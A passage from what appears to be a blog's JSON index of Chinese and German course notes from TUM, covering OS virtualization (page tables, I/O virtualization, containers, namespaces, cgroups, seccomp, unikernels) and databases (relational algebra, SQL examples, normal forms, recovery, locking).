直接使用。），而Hypervisor维护影子页表（SPT）。为了保持页表的同步，Gast-BS只能以只读（Read-Only）方式访问它的页表，任何写入页表的尝试都会被 Hypervisor 拦截（Trap），让Hypervisor好更新Gast-BS的页表与SPT。 相当于影子页表是中间的那层页表。 SPT的问题也很显而易见：管理起来非常复杂而且开销很高（hoher Overhead）。 二级地址转换（Second Level Address Translation, SLAT）SLAT 由 CPU 提供硬件支持，将Gast-BS看到的 Gast 物理地址 (Gast-Physische Adressen) 映射到主机物理地址 (HPA)。Hypervisor 仅在 Guest OS 访问未映射的地址时才介入，减少性能开销。 例子： Intel Extended Page Tables (EPT), AMD Nested Page Tables (NPT) 虚拟机的内存管理跟进程管理的内存分配问题类似，我们也需要考虑该给每台虚拟机分配多少内存。 静态分配会导致不灵活，占用固定资源的问题。 动态分配的原理则是过量分配（Overcommitment）（假设并非所有 VMs 同时需要全部已分配的内存。）但这样会在回收已分配的内存时碰到问题，因为Hypervisor 无法知道哪些内存页是重要的，哪些可以释放。 为了解决这个问题我们可以使用 Ballooning (“balloon driver”)：Gast-BS内部的软件与Hypervisor进行通信：（没有内存压力的虚拟机）释放内存（“气球放气”）；申请内存（”给气球充气“）。 I/O 虚拟化（I/O-Virtualisierung）介绍几种I/O 虚拟化的技术： 完整虚拟化/仿真（Full Virtualization/Emulation）Hypervisor管理所有 Guest VM 的I/O请求，调度I/O资源。 Hypervisor 通过软件多路复用（multiplext）或仿真（emuliert）I/O 设备。 Hypervisor会拦截Guest VM的I/O请求，并将其转发到物理 I/O 设备。 优势： 高效 Gemultiplexte I/O-Geräte sind effizient； 透明 Transparentes Geräte-Management。 问题： 实现起来太复杂； Hypervisor 需要为多种 I/O 设备提供驱动程序。； 如果 I/O 设备完全仿真（Emulation），会产生较高的性能开销（Overhead）。 半虚拟化（Paravirtualization）将 I/O 设备驱动分为两部分 使用拆分驱动架构（Split-Driver-Architektur） 后端驱动（Backend-Treiber）：运行在 Hypervisor 或 I/O 处理 VM 内，实际管理物理设备。 前端驱动（Frontend-Treiber）：运行在 Gast-BS 内，与后端驱动通信。 优势： 开销更低（Geringer Overhead）； 更容易实现； Guest OS 适配更灵活，可以通过 已有驱动支持新设备。 问题： Guest OS 需要额外修改或安装特定驱动。 设备域（Device Domains）一台VM充当所有I/O设备的接口（在Xen中称为Domain 0或”dom0”），其他VMs通过这台VM访问I/O设备，而不是直接访问硬件。 直接 I/O 访问（Direct I/O）使用硬件支持的 I/O 设备多路复用（Multiplexing）。 I/O-MMU（I/O 内存管理单元） 负责管理 Guest VM 的设备内存： 负责 I/O 地址和中断（Interrupt）的映射。 隔离 DMA（直接内存访问）请求，防止 VMs 互相干扰。 优势： Guest VM 直接访问物理设备，提高 I/O 效率。 部分 I/O 处理由硬件完成，减少 Hypervisor 负担。 单根 I/O 虚拟化（Single Root I/O Virtualization, SR-IOV）I/O 设备本身支持虚拟化，将 一个物理设备拆分为多个虚拟功能（ Virtual Functions，VF），会绕过Hypervisor的I/O处理。 Gast VM 看到的是一个独立的 I/O 设备，但实际上它共享了同一个物理设备。 （感觉大部分虚拟化的技术都是通过减轻Hypervisor的负担来提高效率的） 进程虚拟机（Process Virtual Machines）跟系统虚拟机不同的是，进程虚拟机（Process VM）只给单个（或者多个）进程提供虚拟运行环境，使应用程序可以独立于底层操作系统和硬件架构运行。 Runtime会给用户空间进程（User-Space-Prozesse）提供虚拟运行环境，并且负责实现 ABI接口（由系统调用接口（Systemcall Interface）和用户指令集架构（User-ISA）组成）。简单来讲就是Runtime需要负责转换/翻译Systemcall和ISA的指令。 对应用程序来说，整个“系统”由 ABI 接口决定，而不依赖底层硬件或操作系统。 Runtime是类似于Hypervisor的中间层，但他们的核心作用之类的完全不一样。 进程虚拟机的优势： 仿真（Emulation）：程序可以在不同 ISA（指令集架构）上运行。 平台无关性（Plattform-Unabhängigkeit）：程序可以在不同 OS 运行。 性能优化（Performance-Optimierung）：二进制优化器（Binary Optimizer）会优化代码。 高级语言虚拟机（High-Level-Language VMs, HLL VMs）作为进程虚拟机的一种，会提供一个与底层架构无关的虚拟 ISA（ Plattform-unabhängige virtuelle ISA），使得应用程序不依赖特定的操作系统（OS）和硬件架构。主要是为了运行高级编程语言的代码。 比如说 Java Virtual Machine (JVM) 可以解释和执行 Java 字节码（Java Bytecode），让 Java 代码可以在 Windows、Linux、Mac 等不同平台 上运行。 如果多个进程需要共享资源并相互交互（interagieren），则通常使用操作系统级虚拟化（OS-level Virtualization）。 操作系统级虚拟化（OS-level-Virtualization）操作系统级虚拟化（OS-level-Virtualization）可以运行多个隔离的应用进程，共享同一个操作系统（OS）。 Container Leichtgewichtige Virtualisierungsmöglichkeit 轻量化 stellen eine Laufzeitumgebung für User-Space-Prozesse bereit BS wird nicht virtualisiert Isolation von Prozessen möglich Container是OS-Level Virtualization的一种实现。 在传统的 Unix 操作系统中，一些资源是全局管理的，比如说PID, UID (User ID), IP-Addresse, Host- und NIS-Domainnamen，使得具有 root 权限的进程可以访问和影响其他进程，带来安全隐患。所以希望将他们隔离开。 Namespaces 是 Container 的基础：抽象出对系统全局资源的访问 （比如说Filesystem-Mount-Points, Netzressourcen, PIDs, etc.），将所有进程拆成disjoint subsets，使得每个subset里的进程会认为自己是整个系统中唯一的进程。 Jede Ressource ist eindeutig innerhalb eines Namespace-Containers Bestandteile von Container unter LinuxNamespaces作用：Benennung und Adressierung von Ressourcen，实现进程级别的资源隔离。 主要负责隔离。 在实际应用中，我们不总是需要隔离所有系统资源。因此，Linux 提供了多个独立的 Namespace，以实现更灵活的隔离方式，并避免不必要的资源浪费： UTS: Unix Time Sharing (System) Isolieren System-Identifier (z.B.Host- und Domainnamen 主机名和域名) 例如，在 Docker 容器中，每个容器可以拥有自己的主机名，而不会影响宿主机。 IPC: Inter-Process Communication isolieren IPC-Ressourcen 隔离进程间通信、 例如，不同的容器不能访问彼此的共享内存和消息队列，提高安全性。 Network: isolieren Netzressourcen 隔离网络设备、IP 地址、端口、路由表等，允许不同 Namespace 拥有独立的网络栈。 PID: isolieren PID-Räume Prozesse in unterschiedlichen PID-Namespaces können dieselbe PID haben, aber eindeutig innerhalb eines PID-Namespace Es können verschachtelte (engl. nested) PID-Namespaces erstellt werden 可以套娃 在同一 PID 命名空间内，进程可以正常通信；在不同 PID 命名空间之间，父 Namespace 可以向子 Namespace 发送信号，但子 Namespace 不能影响父 Namespace。 Mount: isolieren Mount-Points des Dateisystems 隔离文件系统挂载点，允许不同的 Namespace 看到不同的文件系统视图。 （在 Linux 中，挂载点（Mount Point） 是指将一个文件系统连接到目录结构中的特定位置，使其内容可以通过该目录访问。） 挂载类型 (Mount-Typ)： Shared Mount 共享挂载：接收+传递 该挂载点的 mount 和 umount 事件会在 Peer Group 之间传播。 例如，在 Shared Mount 上挂载一个新目录，所有共享该挂载点的进程都会看到这个变更。 Private Mount 私有挂载：不接收+不传递 挂载点不会接收，也不会向对等组（Peer Groups）传递事件。 Der Mount-Point empfängt und leitet keine Events zu Peer Groups weiter. Slave Mount 从属挂载：接收+不传递 Slave-Mount-Points empfangen Events von einer Master Peer Group. Unbinable Mount 不可绑定挂载： Ist ein Private Mount, der nicht gebunden (Bind Mount) werden kann. 不能被绑定的私人挂载。 (Bind Mount指的是允许将一个目录或文件挂载到另一个位置，使其在多个路径下可见。) Peer Groups（对等组）：Peer Group 是一组共享 mount 事件的挂载点，当一个 Shared Mount 被创建时，它会被添加到某个 Peer Group。所有 Peer Group 内的挂载点都会同步 mount 和 umount 事件。 User: isolieren User- und Group-IDs 隔离用户 ID 和权限 Erhöhte Privilegien sind nur innerhalb des User Namespace gültig. können auch verschachtelte User-Namespaces erstellt werden. 套娃 例如，容器内的 root 实际上是宿主机的普通用户，增强安全性。 Linux Control Groups (cgroups)主要负责限制。 作用： cgroups unterteilen Prozesse in hierarchische Gruppen 将进程划分为层次化的组 分配( Allozieren )和分发( verteilen )每一组的系统资源 （CPU, 内存等） 资源由独立的 cgroup 子系统表示 Jedes Subsystem verwaltet eine Hierarchie an Prozessgruppen Accounting Überwacht Seiten, die von den Prozessgruppen verwendet werden 监控进程使用的内存 Kontrolle weiche Speichergrenzen 确保内存页会被回收（但不是强制的，即在系统压力下会优先释放，但不会立即强制回收） harte Speichergrenzen 会触发 Out-of-Memory-Killer 所有该 cgroup 内的进程会被冻结。 OOM Killer 可能会终止进程或调整内存限制。 如果内存使用量下降到限制以下，进程可以恢复运行。 Secure Computing Mode (Seccomp)用于限制进程可以执行的系统调用（System Calls）。 提供 3 种模式： Disabled： 未启用，可以调用所有 System Call Strict： 只能调用4个：read(), write(), exit() 和 sigreturn() （sigreturn() 是一个 系统调用（syscall），用于 从信号处理程序（signal handler）返回到被中断的进程上下文。） 调用其他的会触发SIGKILL信号。 Filter： 只能使用被过滤过的System Call。 Filter会基于Berkeley Packet Filter (BPF)。 库操作系统（Library OS）其实虚拟机（VM）和Container还是有些问题的： 通用性（Universell）：内核（Kernel）并未针对特定应用进行优化。 额外开销（Overhead）：包含未使用的组件，带来以下问题： 镜像（Abbilder，指的是 VM 或容器的系统镜像（System Image），包含操作系统和应用程序的文件。）过大会导致部署（Deployment，指的是 将 VM 或容器的镜像部署到运行环境中的过程。）变慢。 攻击面（Angriffsfenster）过大，增加安全风险。 容器通常只为一个用户提供一个应用，所以包含许多不必要的功能。 所以我们可以考虑将 VM 作为一个应用进行编译（即 Library OS），用于创建一个最小化、专门针对特定应用优化的虚拟机。 Library OS 会像一个库（Bibliothek）一样运行。在编译过程中，仅包含所需的功能，整个系统可以通过编译器进行优化。一般只会运行一个进程（但支持多线程）。 Library OS 的理念可以理解为：将每个应用程序所依赖的 OS(操作系统) 的 personality(特性) 作为 library(库) ，使其独立地运行在该应用程序的地址空间上。 这种VM 被称为 Unikernel，意味着所有执行都在内核模式（Kernel Mode）进行，并且只有一个地址空间，因为整个 Unikernel 就是一个单进程应用。 缺点：应用程序必须经常进行调整（angepasset werden），因为它们在内部调用其他应用程序，但架构不支持这种调用。核心原因就是不支持多个进程交互。 例题例题1Wie viele PIDs hat ein Prozess unter Linux? Eine pro User Eine pro CPU Eine pro cgroup Eine pro Child Eine pro Prozessgruppe Eine pro PID-Namespace 答案：6。 例题2 Welche Voraussetzungen müssen für hardware-unterstützte Virtualisierung erfüllt sein? Gast kooperiert mit Host-Betriebssystem Syscall-Nummern im Gast- und Host-Kernelsind identisch Gast- und Host-ISA sind identisch Support durch Prozessor Peripheriegeräte unterstützen SR-IOV Gast-Adressen entsprechen Host-Adressen 答案：3，4. 解释：","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"container","slug":"container","permalink":"https://archer-baiyi.github.io/tags/container/"}]},{"title":"GBS-1-Einführung","slug":"TUM info 笔记/GBS/GBS-1-Einführung","date":"2025-03-11T17:15:25.000Z","updated":"2025-04-26T18:30:40.720Z","comments":true,"path":"2025/03/11/TUM info 笔记/GBS/GBS-1-Einführung/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-1-Einf%C3%BChrung/","excerpt":"操作系统基础相关笔记","text":"Grundlagen: Betriebssysteme und SystemsoftwareAufgabe der Informatik:","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Datenbank 笔记","slug":"TUM info 笔记/Datenbank/Datenbank-笔记","date":"2025-03-11T10:37:03.000Z","updated":"2025-04-26T18:30:10.148Z","comments":true,"path":"2025/03/11/TUM info 笔记/Datenbank/Datenbank-笔记/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%20info%20%E7%AC%94%E8%AE%B0/Datenbank/Datenbank-%E7%AC%94%E8%AE%B0/","excerpt":"数据库基础相关笔记","text":"1. Datenbankentwurf / ER-ModellierungEntity-relationship diagram Funktionalitäten: 1:1, 1:N, N:1, N:M Min-Max: (min,max) Multiplizität 2. Das Relationale ModellSchlüssel, Primärschlüssel Relationen mit gleichem Schlüssel kann man zusammenfassen. Anomalie: 异常 Die Relationale Algebra Selektion Projektion (会自动去重) Kreuzprodukt Join (Verbund) Umbenennung Mengendifferenz Division Vereinigung Mengendurchschnitt Semi-Join (linkes Argument wird gefiltert) (筛选左表，仅保留在右表中有匹配记录的左表行。) Semi-Join (rechtes Argument wird gefiltert) Anti-Semi-join ⟕ linker äußerer Join (会保留左表中的所有记录，即使在右表中没有匹配的记录时，右表对应的位置会以 NULL 填充。) ⟖ rechter äußerer Join ⟗ (voller) äußerer Join Der Relationenkalkül (relationaler Tupelkalkül) Bsp.: Der Domänenkalkül Bsp.: ü Diese 3 Sprachen sind gleich mächtig 3. SQLstandadisierte -Datendefinitions (DDL)- -Datenmanipulations (DML)- -Anfrage (Query)-Sprache Datendefinition (DDL)Datentypen: character(n), char(n) character varying(n), varchar(n) numeric(p,s), integer, decimal p（precision，精度）：数值的总位数（包含小数点前后的所有数字）。 s（scale，小数位数）：小数部分的位数（小数点后的位数）。 blob oder raw – für sehr große binäre Daten clob – für sehr große String-Attribute date – für Datumsangaben xml – für XML-Dokumente 1234create table Professoren ( PersNr integer not null, Name varchar(30) not null, Rang character(2)); DatenmanipulationEinfügen von Tupeln 1234insert into hörenselect MatrNr, VorlNrfrom Studenten, Vorlesungenwhere Titel = 'Logik'; 12insert into Studenten (MatrNr, Name)values (28121, 'Archimedes'); Löschen von Tupeln 12delete Studentenwhere Semester &gt; 13; Verändern von Tupeln 12update Studentenset Semester = Semester + 1; Anfrage123select (distinct) asfromwhere and Sortieren: 123select PersNr, Name, Rangfrom Professorenorder by Rang desc, Name asc; Mengenoperation: 1union, intersect, minus 12345selectfromwhere (not) exists (select from where)where not in () 比较： 1(where) value &gt;= ALL(子查询) Aggregationsfunktion: 1avg, max, min, count, sum Gruppierung: 1234selectfrom(where)group by Alle in der select-Klausel aufgeführten Attribute - außer den aggregierten - auch in der group by-Klausel aufgeführt werden. 比如说下面这里的gelesenVon, Name： 12345select gelesenVon, Name, sum(SWS)from Vorlesungen, Professorenwhere gelesenVon = PersNr and Rang = 'C4'group by gelesenVon, Name having avg(SWS) &gt;=3; Casting: 12cast(expression AS target_data_type)cast(h.AnzProVorl as decimal(6,2)) Allquantor und Implikation: ( \\forall t \\in R \\ (P(t)) ) \\Leftrightarrow ( \\neg (\\exists t \\in R \\ (\\neg P(t))) )(R \\Rightarrow T) \\Leftrightarrow (\\neg R \\lor T)Auswertung bei NULL-Werten and, between, in (1,2,3,4) like mit Platzhalter: “%” (für beliebig biele Zeichen) “_” (für genau ein Zeichen) case left/right/full outer join Rekursion Vorgänger des „Wiener Kreises“ der Tiefe n: 1234567891011select v1.Vorgängerfrom voraussetzen v1, ... voraussetzen vn_minus_1, voraussetzen vn, Vorlesungen vwhere v1.Nachfolger = v2.Vorgänger and ... vn_minus_1.Nachfolger = vn.Vorgänger and vn.Nachfolger = v.VorlNr and v.Titel = 'Der Wiener Kreis'; Mit Rekursion: 123456789101112131415161718192021with recursive TransVorl (Vorg, Nachf) as ( -- 递归的基础查询（初始层级） select Vorgänger, Nachfolger from voraussetzen union all -- 递归部分（从前一层继续查找更深的层级） select t.Vorg, v.Nachfolger from TransVorl t, voraussetzen v where t.Nachf = v.Vorgänger)select Titel from Vorlesungen where VorlNr in ( select Vorg from TransVorl where Nachf in ( select VorlNr from Vorlesungen where Titel = 'Der Wiener Kreis' )); 4. DatenintegritätIntegritätsbedingungen: -Schlüssel -Beziehungskardinalitäten -Attributdomänen -Inklusion bei Generalisierung Referentielle Integrität Fremdschlüssel Änderung von referenzierten Daten: Default 会拒绝执行主键的更改操作 cascade (Kaskadieren): 级联，外键会随着主键的更改一起更改 set NULL Statische Integritätsbedingungen: 12create table Studenten(Semester integer check Semester between 1 and 13) 12create table Prof(Rang character(2) check(Rang in ('C2','C3','C4'))) Konsistenzbedingung: 1234567create table prüfen(MatrNr ···VorNr ···Note ···primary key (MatrNr,VorNr))constraint VorherHören check (···) Trigger: 123456789101112131415161718192021-- 1. create trigger keine Degradierung-- 2.before update on Professorenfor each row-- 3.when (old.Rang is not null)begin-- 4. if :old.Rang = 'C3' and :new.Rang = 'C2' then :new.Rang := 'C3'; end if; if :old.Rang = 'C4' then :new.Rang := 'C4'; end if; if :new.Rang is null then :new.Rang := :old.Rang; end if;end; create trigger Anweisung, gefolgt von einem Namen, der Definition des Auslösers, in diesem Fall bevor eine Änderungsoperation (before update on) auf einer Zeile (for each row) der Tabelle Professoren ausgeführt werden kann, einer einschränkenden Bedingung (when) und einer Prozedurdefinition in der Oracle-proprietären Syntax. Temporale Daten 5. Relationale EntwurfstheorieFunktionale AbhängigkeitenFunctional Dependency (FD) A B C D a4 b2 c4 d3 a1 b1 c1 d1 a1 b1 c1 d2 a2 b2 c3 d2 a3 b2 c4 d3 R:= {A,B,C,D} 假设 : (可以理解成函数的 rechtseindeutig) Super-Schlüssel : ( 生成元) voll funktional abhängig von () : kann nicht mehr verkleinert werden () Kandidaten-Schlüssel: ( 最小生成元) Armstrong-Axiome FD-Hülle einer Attributmenge Kanonische Überdeckung 没有冗余的属性(Attribute)和依赖(Abhängigkeit) Berechnung: 消除右部冗余属性 (, 时仅保留 和 ) 消除左部冗余属性 删除冗余的函数依赖 (，， 时仅保留 和 ) R = R1 R2 2 Korrektheitskriterien für die Zerlegung von Relationenschemata: Verlustlosigkeit Abhängigkeitserhaltung verlustlose Zerlegung: ( R = R1 R2 ) Hinreichende Bedingung für die Verlustlosigkeit einer Zerlegung: oder NormalformenErste Normalform (1NF): Nur atomare Domäne. 都要是singleton，不能出现集合或者重复行 反例： Vater Mutter Kinder Johann Martha {Else, Lucie} Johann Maria {Theo, Josef} Heinz Martha {Cleo} 正例： Vater Mutter Kind Johann Martha Else Johann Martha Lucie Johann Maria Theo Johann Maria Josef Heinz Martha Cleo Zweite Normalform (2NF)： falls jedes Nicht(kandidat)schlüssel-Attribut voll funktional abhängig ist von jedem Kandidatenschlüssel der Relation. 假设R:= {A,B,C,D}的Kandidaten-Schlüssel是{A,B},那么需要满足C,D sind voll funktional abhängig von {A,B}。 只要出现类似{A} {C}之类的就不行了。 可以理解成不能有多余列。 Remark: 如果Kandidaten-Schlüssel只有一个元素，那么一定满足2NF。 反例（1非2）： A B C x a 1 x b 1 y c 2 {A,B}为Kandidaten-Schlüssel。有{A} {C}。 Dritte Normalform (3NF)： wenn für jede für geltende funktionale Abhängigkeit der Form mit und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial Das Attribut ist in einem Kandidatenschlüssel von enthalten – also ist prim ist Superschlüssel von 假如{A,B}是Kandidatenschlüssel，那么可以{C,D} {A}是符合第二条要求的。（但是这个不满足后面的BCNF） 反例（2非3）： A B C D x a 1 n x b 2 m y c 2 m 满足{A,B} {C}， {A,B} {D} voll，所以满足2NF； 有{C} {D}，所以不满足3NF。 Synthesealgorighmus: zerlegen R in R1,…,Rn, sodass: R1,…,Rn verlustlos R1,…,Rn abhägigkeitserhaltend Alle R1,…,Rn in 3NF Boyce-Codd-Normalform (BCNF)： wenn für jede für geltende funktionale Abhängigkeit der Form (FDs) und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial ist Superschlüssel von 反例（3非BCNF）： A B C D x a 1 1 x b 2 1 y a 3 2 y b 2 1 有 AB CD C B 因为B属于Kandidatschlüssel，所以满足3NF，但是不满足BCNF。 Man kann jede Relation verlustlos in BCNF-Relationen zerlegen, aber nicht unbedingt abhägigkeitserhaltend. Dekompositions-Algorithmus Mehrwertige Abhägigkeit (Multivalued Dependency, MVD): 2行对上，2行交叉对应 Jede FD is auch eine MVD: Eine MVD ist trivial iff: oder Vierte Normalform (4NF): falls für jede MVD eine der folgenden gilt: Die MVD ist trivial oder ist Superschlüssel von R 6. Physische DatenorganisationSpeicherhierarchieRegister Cache Hauptspeicher Plattenspeicher Archivspeicher RAIDRedundant Arrays of Independent Disks MTTF, MTTR, MTTDL RAID 0: Striping RAID 1: Spiegelung RAID 0+1(10): Striping und Spiegelung RAID 2: Striping auf Bit-Ebene RAID 3: Striping auf Bit-Ebene mit Paritätsinfo RAID 4: Striping von Blöcken RAID 5: Striping von Blöcken, Verteilung der Paritätsblöcke IndexstrukturenB-BäumeB+-BäumeErweiterbares HashingDynamisches Wachsen möglich Beispiel: gespiegelte binäre PersNr h(004) = 00100000… (4=0…0100) h(006) = 01100000… (6=0…0110) h(048) = 00001100… (48=0…0110000) Globale Tiefe Lokale Tiefe R-Baummehrdimensionalen Zugriffsstrukturen 7. AnfragebearbeitungLogische OptimierungKanonische Übersetzung: SQL Relationale Algebra Äquivalenzerhaltende Transformationsregeln 一共12条 Dependent Join Physische OptimierungNested Loop Joinforeach : ​ foreach : ​ if s.a=r.a then Res:= Res (r s) O(N*M) Block-Nested Loop Algorithmusforeach Block ​ foreach ​ foreach ​ if s.b = r.a then Res:= Res (r s) O(N * M/B) (M/B: Anzahl der Blöcke) Index-JoinVoraussetzung: 其中一个表是sortiert的且有B-Baum O(N * log(M)) Merge-JoinVoraus.: 2个表都是sortiert的 O(N+M) linear Hash-Join选定一个哈希函数h()，计算R.A的值，分配到hash buckets里，然后再计算S.B的值，在哈希桶里匹配。 不需要预先排序 Partitionieren und Hashing的话需要2个哈希函数。 O(N+M) linear Join mit Hashfilter (Bloom-Filter)需要很多个（k个）不同的哈希函数forall : 计算h_i(a) forall 0覆盖1。 会出现False Positive，但是不会出现False Negative Externes SortierenSelektivität Dynamische Programmierung: Phase: Zugriffspläne ermitteln Phase: Join-Pläne ermittel (2-fach, …, n-fach) Phase: Finalisierung 8. TransaktionsverwaltungBegin of Transaction (BOT)：转账开始的标志 read：读存款 write：写入（修改存款，出账入账） commit：转账结束，所有操作festschreiben abort：取消转账，所有状态复原 define savepoint backup transaction: Auf den jüngsten Sicherungspunkt zurücksetzen. commit work rollback work: Alle Änderungen sollen zurückgesetzt werden. ACID: Atomicity (Atomarität)：原子性。 Alles oder Nichts. Consistency：一致性。 Isolation：隔离性。 Durability (Dauerhaftigkeit)：持久性。 所有更改都必须永久存储。Änderungen erfolgreicher Transaktionen dürfen nie verloren gehen. 9. Fehlerbehandlung (Recovery)Fehlerklassifikation Lokaler Fhler in einer noch nicht festgeschriebenen Transaktion Wirkung zurücksetztenR1-Recovery Fehler mit Hauptspeicherverlust Abgeschlossene TAs erhalten bleiben R2-Recovery redo Noch nicht abgeschlossene TAs zurücksetzten R3-Recovery undo Fehler mit Hintergrundspeicherverlust R4-Recovery steal：未提交的事务修改的页面不会被替换。 steal：允许替换缓存中的任何非固定页面。 force：事务提交时立即将数据写入磁盘。 force：修改的数据仍可保留在缓存中，提高性能。 Auswirkung auf Recovery: force force steal - Kein Undo- Kein Redo - Kein Undo- Redo steal - Undo- Kein Redo - Undo- Redo Einbringungsstrategie（数据提交策略）: Update in Place：直接覆盖 Twin-Block-Verfahren：复制整个数据块 Schattenspeicherkonzept：复制修改的页面 Log-Einträge: LSN (Log Sequence Number)：日志序列号 Transaktionskennung(TA_ID) PageID Redo：纪录当前操作（比如说+=50） Undo：当前操作的逆向（比如-=50） PrevLSN：上一个日志记录的指针 [LSN, TransaktionsID, PageID, Redo, Undo, PrevLSN] （中括号） Protokollierung: Physische Protokollierung before-image：修改前的Zustand after-image Logische Protokollierung Undo-Code Redo-Code Log-Information会记录2次以上： Log-Datei R1,R2,R3 Log-Archiv R4 WAL-Prinzip (Write Ahead Log)： Commit前，确保所有相关的日志记录已写入日志文件。 modifizierte Seite auslagern前，确保相关日志记录已写入日志存档（Log-Archiv）。 Winner：在崩溃前已经完成，需要Redo Loser：在崩溃时仍然处于未提交状态，需要Undo Wiederanlauf: Analyse Log-Datei analysieren Winner-Menge ermitteln Loser-Menge ermitteln Redo Undo CLR: Compensating Log Record 用于记录撤销的操作。（给undo的） 简单来说就是为了预防恢复崩溃时发生的其他崩溃。 CLR-Einträge: LSN (Log Sequence Number)：日志序列号 Transaktionskennung(TA_ID) PageID Redo： PrevLSN：上一个日志记录的指针 UndoNxtLSN：Verweis auf die nächste rückgängig zu machende Änderung （尖括号） 注意：CLR没有undo信息。 3种Sicherungspunkte(-Qualitäten)： transaktionskonsistent （事务一致） 所有已提交的事务都被完全存储，未提交的都没有被写入磁盘。（只在所有活跃事务完成后进行检查点记录） aktionskonsistent （操作一致） 可能包含未提交的事务，但是所有操作都是完整的。 unscharf (fuzzy) 修改的页面不会立即写入磁盘，只记录“脏页”的信息，而不是数据本身 DirtyPages (Menge der modifizierten Seiten, 尚未写入磁盘), MinDirtyPageLSN, MinLSN R4-Recovery 10. MehrbenutzersynchronisationFehler (bei unkontroliertem Mehrbenutzerbetrieb): Lost Update: Verlorengegangene Änderungen Dirty Read: Abhängigkeit von nicht freigegebenen Änderungen Phantomproblem HistorieSeiralisierbarkeit 2 Historien äquivalent: wenn sie die Konfliktoperationen der nicht abgebrochenen Transaktionen in derselben Reihenfolge ausführen. SR: Eine Historie ist serialisierbar wenn sie äquivalent zu einer seriellen Historie Hs ist. Eine Historie H serialisierbar der zugehörige Serialisierbarkeitsgraph SG(H) azyklisch ist. liest von in der Historie H RC: rücksetzbare Historie kaskadierendes Rücksetzen (Cascading Rollback)： 假如T2读取了T1里被修改过但是还未被提交（commit）的数据，那么当T1 abort的时候，也需要abort T2。 ACA: Historien ohne kaskadierendes Rücksetzen (avoiding cascading abort) ST: Strikte Historien 想要对一个被修改过的对象进行操作前，必须要确保其已经被commit或者abort了。 Sperrbasierte Synchronisation （锁）Sperrmodi: S (shared, read lock) 允许多个事务（Transaktion）同时读取数据，但不能进行写操作。 X (exclusive, write lock) 允许事务对数据进行读取和写入，但其他事务不能同时访问该数据。 Verträglichkeitsmatrix / Kompatibilitätsmatrix: NL S X S ✅（兼容） ✅ ❌ X ✅ ❌（不兼容） ❌ Zwei-Phasen-Sperrprotokoll: Wachstumsphase：只获取锁 Schrumpfphase：只释放锁 Strenges Zwei-Phasen-Sperrprotokoll: 所有锁直到事务提交（commit）或回滚（abort）后才释放，避免级联回滚。 Verklemmungen (Deadlocks) Erkennung: Wartegraph Vermeidung: Preclaiming durch Zeitstempel Wound-Wait Strategie Wait-Die Strategie Multi-Granularity Locking (MGL) Phantomproblem: Zugriffsweg sperren Zeitstempel-basierende SynchronisationreadTS(A)：上次读取 A的时间戳。 writeTS(A)：上次写入 A 的时间戳。 Synchronisationsverfahren: 当 Ti 试图读取数据 A (ri(A))： 若 TS(Ti)&lt;writeTS(A)，则 Ti必须被回滚（因为 AAA 可能已被更新）。 否则，Ti可以继续读取，并更新 readTS(A) = max(TS(Ti), readTS(A))。 当 Ti 试图写入数据 A (wi(A))： 若 TS(Ti)&lt;readTS(A)，说明在 Ti之前已经有其他事务读取了 A，则 Ti 必须回滚。 若 TS(Ti)&lt;writeTS(A)，说明 Ti 试图覆盖一个更新的值，必须回滚。 否则，Ti可以写入，并更新 writeTS(A) = TS(Ti)。 Optimistische Synchronisation Lesephase Validierungsphase（验证） Schreibphase Snapshot Isolation Synchronisation von Indexstrukturen: zu aufwendig, redundante Transaktionsverwaltung in SQL92isolation level: read uncommited read commited repeatable read serializable","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Dantenbank 